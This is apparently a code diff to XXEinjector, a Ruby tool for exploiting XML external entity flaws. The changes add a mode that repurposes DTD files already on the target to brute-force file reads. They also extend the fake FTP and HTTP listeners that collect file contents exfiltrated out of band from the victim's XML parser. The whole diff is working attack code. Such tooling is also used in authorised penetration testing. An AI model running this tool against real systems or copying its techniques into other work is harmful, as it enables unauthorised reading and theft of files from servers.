-	if ($xslt == "n" && enumports == "" && $logger == "n") || ($logger == "y" && enum == "http") || ($direct != "" && cdata == "y")
+	if ($xslt == "n" && enumports == "" && $logger == "n" && $localdtd == "") || ($logger == "y" && enum == "http") || ($direct != "" && cdata == "y")
 		http = TCPServer.new http_port
 	end
-	if enum == "ftp" && $xslt == "n" && enumports == "" && $direct == ""
+	if enum == "ftp" && $xslt == "n" && enumports == "" && $direct == "" && $localdtd == ""
 		ftp = TCPServer.new ftp_port
 	end
-	if enum == "gopher" && $xslt == "n" && enumports == "" && $direct == ""
+	if enum == "gopher" && $xslt == "n" && enumports == "" && $direct == "" && $localdtd == ""
 		gopher = TCPServer.new gopher_port
 	end
 	if upload != ""
@@ -831,8 +1022,16 @@ loop do
 			puts "[+] Response with file/directory content received:\n" + req + "\n" if $verbose == "y"
 			
 			# retrieve p parameter value and respond
-			req = req.sub("GET /?p=", "").split(" ")[0]
+			req = req[/\?p=([^ \r\n]*)/, 1].to_s
 			client.print("HTTP/1.1 200 OK\r\nContent-Length: 6\r\nConnection: close\r\nContent-Type: text/plain\r\n\r\nThanks")
+
+			# an empty parameter means the file could not be read - without this
+			# check the rest of the request line gets logged as if it were data
+			if req == ""
+				puts "[-] Callback carried no data." if $verbose == "y"
+				client.close
+				break
+			end
 
 			# base64 decode if parameter was encoded
 			if phpfilter == "y"
@@ -878,59 +1077,119 @@ if enum == "ftp"
 		#puts "Response with file/directory content received. Enumeration unlocked." if $verbose == "y"
 		$tmppath = $nextpath
 		client.puts("220 XXEinjector Welcomes!")
+		dataserv = nil
 		begin
 		status = Timeout::timeout($contimeout) {
 			loop {
 				req = client.gets()
-				break if req.nil?	
-	
-				# respond with proper option
-				if req.include? "LIST"
+				break if req.nil?
+				cmd = req.chomp
+				puts "[FTP] #{cmd}" if $verbose == "y"
+
+				# passive mode has to be answered with a port we really listen on,
+				# otherwise clients like the PHP ftp:// wrapper never send RETR and
+				# our data, which rides in the RETR path, never arrives
+				if cmd.match(/^(PASV|EPSV)/i)
+					dataserv.close if !dataserv.nil? && !dataserv.closed?
+					begin
+						dataserv = TCPServer.new("0.0.0.0", ftp_port.to_i + 1)
+					rescue Errno::EADDRINUSE
+						dataserv = TCPServer.new("0.0.0.0", 0)
+					end
+					dataport = dataserv.addr[1]
+					puts "[FTP] passive data port #{dataport}" if $verbose == "y"
+					Thread.start(dataserv) do |serv|
+						Thread.current.report_on_exception = false
+						loop { serv.accept.close }
+					end
+					if cmd.match(/^EPSV/i)
+						client.puts("229 Entering Extended Passive Mode (|||#{dataport}|)")
+					else
+						pasvip = host.match(/^\d+\.\d+\.\d+\.\d+$/) ? host : "127.0.0.1"
+						client.puts("227 Entering Passive Mode (#{pasvip.tr('.', ',')},#{dataport / 256},#{dataport % 256})")
+					end
+					next
+				end
+
+				# directory listing
+				if cmd.match(/^LIST/i)
 					client.puts("drwxrwxrwx 1 xxe xxe          1 Jan 01 01:01 xxe")
 					client.puts("150 Opening BINARY mode data connection for /xxe")
 					client.puts("226 Transfer complete")
+					next
 				end
-				if req.include? "USER"
-					client.puts("331 password required")
+
+				# rest of the conversation - these lines are not retrieved data,
+				# so they are answered but never logged as file content
+				if cmd.match(/^(USER|PASS|ACCT|TYPE|MODE|STRU|NOOP|OPTS|SYST|FEAT|PWD|XPWD|CWD|CDUP|SIZE|MDTM|REST|PORT|EPRT|ALLO|SITE|STAT|HELP|ABOR|QUIT)\b/i)
+					if cmd.match(/^USER/i)
+						client.puts("331 password required")
+					elsif cmd.match(/^PASS/i)
+						client.puts("230 Now you can send data")
+					elsif cmd.match(/^SYST/i)
+						client.puts("215 UNIX Type: L8")
+					elsif cmd.match(/^FEAT/i)
+						client.puts("211 No features")
+					elsif cmd.match(/^(PWD|XPWD)/i)
+						client.puts("257 \"/\" is current directory")
+					elsif cmd.match(/^(CWD|CDUP)/i)
+						# while bruteforcing files the path is a file, and a client
+						# that gets 250 here treats it as a directory and never
+						# sends RETR - directory enumeration still needs 250
+						if $brute != ""
+							client.puts("550 No such directory")
+						else
+							client.puts("250 Directory changed")
+						end
+					elsif cmd.match(/^SIZE/i)
+						# a failed SIZE makes clients give up before RETR
+						client.puts("213 1")
+					elsif cmd.match(/^MDTM/i)
+						client.puts("213 20000101000000")
+					elsif cmd.match(/^PORT/i)
+						client.puts("200 PORT command OK")
+					elsif cmd.match(/^QUIT/i)
+						client.puts("221 Bye")
+						break
+					else
+						client.puts("200 Command OK")
+					end
+					next
 				end
-				if req.include? "PORT"
-					client.puts("200 PORT command OK")
+
+				# truncate requests to proper format and base64 decode if encoded
+				if cmd.match(/^RETR /i)
+					client.puts("150 Opening BINARY mode data connection")
+					client.puts("226 Transfer complete")
+					req = req.split(' ')[1..-1].join(' ')
+					# leading slash is the URL path separator, not part of our data
+					req = req.sub(/^\//, '')
+					req += "\n"
 				else
 					client.puts("230 Now you can send data")
 				end
-			
-				# truncate requests to proper format and base64 decode if encoded
-				if req.include? "RETR "
-					req = req.split(' ')[1..-1].join(' ')
-					req += "\n"
-				end
-	
+
 				if phpfilter == "y"
 					req = Base64.decode64(req)
 				end
-	
+
 				# if PHP expect then print and exit
 				if expect != ""
 					puts "[+] Result of \"#{expect}\" command:\n" + req
 					exit(1)
 				end
-				
+
 				# logging to file
-				log(req)	
-	
-				# clear requests that are known to be not part of directory listing
-				req = req.chomp
-				if req.include?("CWD ") || req.match(/^USER /) || req.match(/^PASS /) || req == "TYPE I" || req.include?("EPSV") || req == "TYPE A" || req == "LIST"
-					req = ""
-				end
-	
+				log(req)
+
 				# push to array if directory listing is detected for further enumeration
-				pusharr(req)
-	
+				pusharr(req.chomp)
+
 			}
 		}
 		rescue Timeout::Error
 		end
+		dataserv.close if !dataserv.nil? && !dataserv.closed?
 		client.close
   	  end
 	end
@@ -983,9 +1242,14 @@ end
 if $logger == "y"
 	puts "[+] You can now make requests."
 	puts "[+] Enter \"exit\" to quit."
-	loop do
-		cmp = Readline.readline("> ", true)
-		exit(1) if cmp.chomp == "exit"
+	if $stdin.tty?
+		loop do
+			cmp = Readline.readline("> ", true)
+			exit(1) if cmp.nil? || cmp.chomp == "exit"
+		end
+	else
+		# no terminal to type "exit" into, keep logging until killed
+		sleep
 	end
 end
 
@@ -1131,17 +1395,17 @@ if $brute == ""
 		configreq()
 		sendreq()
 		send2ndreq() if $secfile != ""
-		if !$response.body.include?("#{$direct.split(",")[0]}")
+		if !respbody().include?("#{$direct.split(",")[0]}")
 			puts "[-] Response does not contain unique mark."
 			exit(1)
 		else
-			if $response.body.include?("#{$direct.split(",")[0]}#{$direct.split(",")[1]}")
+			if respbody().include?("#{$direct.split(",")[0]}#{$direct.split(",")[1]}")
 				puts "[-] File/directory could not be retrieved."
 				exit(1)
 			else
 				puts "[+] Retrieved data:"
 				
-				$response.body[/(#{$direct.split(",")[0]})(.*)(#{$direct.split(",")[1]})/m].gsub("#{$direct.split(",")[0]}", "\n").gsub("#{$direct.split(",")[1]}", "\n").split("\n").each do |param|
+				respbody()[/(#{$direct.split(",")[0]})(.*)(#{$direct.split(",")[1]})/m].gsub("#{$direct.split(",")[0]}", "\n").gsub("#{$direct.split(",")[1]}", "\n").split("\n").each do |param|
 					
 					# log to separate file
 					log(param + "\n")
@@ -1262,15 +1526,15 @@ loop do
 						end
 					end
 				else
-					if not $response.body.include?("#{$direct.split(",")[0]}")
+					if not respbody().include?("#{$direct.split(",")[0]}")
 						puts "[-] Response does not contain unique mark."
 					else
-						if $response.body.include?("#{$direct.split(",")[0]}#{$direct.split(",")[1]}")
+						if respbody().include?("#{$direct.split(",")[0]}#{$direct.split(",")[1]}")
 							puts "[-] File/directory could not be retrieved."
 						else
 							$done = 0
 							puts "[+] Retrieved data:"
-							$response.body[/(#{$direct.split(",")[0]})(.*)(#{$direct.split(",")[1]})/m].gsub("#{$direct.split(",")[0]}", "\n").gsub("#{$direct.split(",")[1]}", "\n").split("\n").each do |param|				
+							respbody()[/(#{$direct.split(",")[0]})(.*)(#{$direct.split(",")[1]})/m].gsub("#{$direct.split(",")[0]}", "\n").gsub("#{$direct.split(",")[1]}", "\n").split("\n").each do |param|				
 
 								# log to separate file
 								log(param + "\n")
@@ -1290,12 +1554,18 @@ loop do
 			exit(1)
 		end
 	else
-		brutefile = File.open($brute, "r")
-		exit(1) if IO.readlines(brutefile)[i].nil?
-		
+		# read the list of paths once
+		if $brutelines.nil?
+			if !File.exist?($brute)
+				puts "[-] Cannot find file with paths to bruteforce: #{$brute}"
+				exit(1)
+			end
+			$brutelines = File.readlines($brute)
+		end
+		exit(1) if $brutelines[i].nil?
+
 		# Read next line
-		line = IO.readlines(brutefile)[i]
-		line = line.chomp
+		line = $brutelines[i].chomp
 
 		log = File.open($output, "a")
 		log.write "\n"
@@ -1318,29 +1588,65 @@ loop do
 		line = line.gsub(' ','%20')
 
 		# Send request with next filename
-		if $direct == ""
-			enumpath = "#{line}"
-		else
-			$directpath = "#{line}"
-			configreq()
-		end
-		sendreq()
-		send2ndreq() if $secfile != ""
+		if $localdtd != ""
 
-		if $direct != ""
-			if not $response.body.include?("#{$direct.split(",")[0]}")
-				puts "[-] Response does not contain unique mark." if $verbose == "y"
+			# repurpose a DTD that is already on the target, one template at a
+			# time, and keep the one that turns out to be present
+			$ldtdtpls = ldtdtemplates() if $ldtdtpls.nil?
+			data = nil
+			$ldtdtpls.each do |tpl|
+				$ldtdshapes.each do |shape|
+					$dtd = ldtdpayload(tpl, "file:///#{line}", phpfilter, shape)
+					configreq()
+					sendreq()
+					send2ndreq() if $secfile != ""
+					data = ldtdextract(respbody(), phpfilter)
+					if data.nil?
+						puts "[-] No data with local DTD \"#{tpl['name']}\", #{shape} form." if $verbose == "y"
+					else
+						puts "[+] Local DTD \"#{tpl['name']}\" is present, #{shape} form: #{tpl['path']}" if $ldtdok != "#{tpl['name']}|#{shape}"
+						$ldtdok = "#{tpl['name']}|#{shape}"
+						$ldtdtpls = [tpl]
+						$ldtdshapes = [shape]
+						break
+					end
+				end
+				break unless data.nil?
+			end
+			if data.nil?
+				puts "[-] Nothing retrieved. File may not exist or be too long for the error message."
 			else
 				log = File.open($output, "a")
-				log.write $response.body[/(#{$direct.split(",")[0]})(.*)(#{$direct.split(",")[1]})/m].gsub("#{$direct.split(",")[0]}", "\n").gsub("#{$direct.split(",")[1]}", "\n") + "\n"
-				puts "[+] Bruteforced request logged: #{$directpath}" if $verbose == "y"
+				log.write data
+				log.write "\n"
 				log.close
+				puts "[+] Retrieved data:"
+				puts data
+			end
+		else
+			if $direct == ""
+				enumpath = "#{line}"
+			else
+				$directpath = "#{line}"
+				configreq()
+			end
+			sendreq()
+			send2ndreq() if $secfile != ""
+
+			if $direct != ""
+				if not respbody().include?("#{$direct.split(",")[0]}")
+					puts "[-] Response does not contain unique mark." if $verbose == "y"
+				else
+					log = File.open($output, "a")
+					log.write respbody()[/(#{$direct.split(",")[0]})(.*)(#{$direct.split(",")[1]})/m].gsub("#{$direct.split(",")[0]}", "\n").gsub("#{$direct.split(",")[1]}", "\n") + "\n"
+					puts "[+] Bruteforced request logged: #{$directpath}" if $verbose == "y"
+					log.close
+				end
 			end
 		end
 
 		i = i + 1
-		
-		brutefile.close
+
 		sleep timeout
 	end
 end
